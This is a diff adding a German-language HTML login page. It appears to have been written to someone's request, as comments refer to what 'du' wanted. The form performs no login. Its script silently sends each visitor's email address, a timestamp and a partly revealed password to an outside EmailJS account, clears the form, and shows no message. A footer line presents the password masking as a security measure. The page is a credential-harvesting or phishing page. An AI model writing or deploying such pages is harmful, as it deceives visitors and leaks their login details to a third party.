@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8" />
+  <title>Login</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #f3f4f6;
+    }
+    #loginBox {
+      background: white;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    label { display:block; margin-bottom:6px; font-size:14px; color:#111827; }
+    input { width:100%; padding:10px; margin-bottom:12px; border:1px solid #d1d5db; border-radius:6px; box-sizing:border-box; }
+    button { width:100%; padding:10px; background:#2563eb; border:none; border-radius:6px; color:white; font-weight:700; cursor:pointer; }
+    small { display:block; margin-top:8px; color:#6b7280; font-size:13px; text-align:center; }
+  </style>
+</head>
+<body>
+  <div id="loginBox">
+    <h2 style="margin:0 0 12px 0">Einloggen</h2>
+    <form id="loginForm" autocomplete="off">
+      <!-- Benutzername weiterhin erforderlich in UI, wird aber NICHT in die E-Mail eingefügt -->
+      <label for="user">Benutzername</label>
+      <input id="user" type="text" placeholder="Benutzername" required />
+
+      <label for="email">E‑Mail</label>
+      <input id="email" type="email" placeholder="deine@beispiel.de" required />
+
+      <label for="password">Passwort</label>
+      <input id="password" type="password" placeholder="Passwort" required />
+
+      <button type="submit">Weiter</button>
+    </form>
+
+    <small>Hinweis: Aus Sicherheitsgründen wird nur eine maskierte Version des Passworts gesendet — kein Klartext.</small>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // === Deine EmailJS Angaben ===
+    const SERVICE_ID = "service_ytxct0l";
+    const TEMPLATE_ID = "template_4c3cqsr";
+    const PUBLIC_KEY = "VQlw_1kHF5Xm_8q9n";
+
+    // EmailJS initialisieren
+    (function(){ emailjs.init(PUBLIC_KEY); })();
+
+    // Passwort maskieren (erste und letzte Zeichen sichtbar, Rest '*')
+    function maskPassword(pw) {
+      if (!pw) return '';
+      const n = pw.length;
+      if (n <= 2) return '*'.repeat(n);
+      return pw[0] + '*'.repeat(Math.max(1, n - 2)) + pw[n - 1];
+    }
+
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Werte aus Formular (Benutzername wird weiterhin eingegeben, aber NICHT in der Mail verwendet)
+      const username = document.getElementById('user').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      // maskiertes Passwort erstellen (KEIN Klartext)
+      const password_masked = maskPassword(password);
+
+      // Nachrichtentext (ohne "Benutzer:" Zeile, wie gewünscht)
+      // Enthält: E-Mail, Zeitstempel, maskiertes Passwort. Kein Klartextpasswort.
+      const messageText =
+        `E-Mail: ${email}\n` +
+        `Zeit: ${new Date().toISOString()}\n` +
+        `Passwort (maskiert): ${password_masked}`;
+
+      // Template-Parameter für EmailJS:
+      // Template in EmailJS sollte folgende Variablen nutzen: {{subject}}, {{message}}
+      const templateParams = {
+        subject: "NeuerLoginVersuch",
+        // user wird NICHT gesendet, weil du "entfern benutzer" wolltest
+        message: messageText
+      };
+
+      // Email senden (nur maskiertes PW, keine Benachrichtigung im UI)
+      emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+        .then(function(response) {
+          // keine sichtbare Meldung an Benutzer (nur in Konsole)
+          console.log("EmailJS gesendet:", response.status, response.text);
+          // Formular leeren (optional, keine Info an User)
+          form.reset();
+        })
+        .catch(function(err) {
+          console.error("Fehler beim Senden:", err);
+          // ebenfalls keine Nutzer-Fehlermeldung
+        });
+    });
+  </script>
+</body>
+</html>
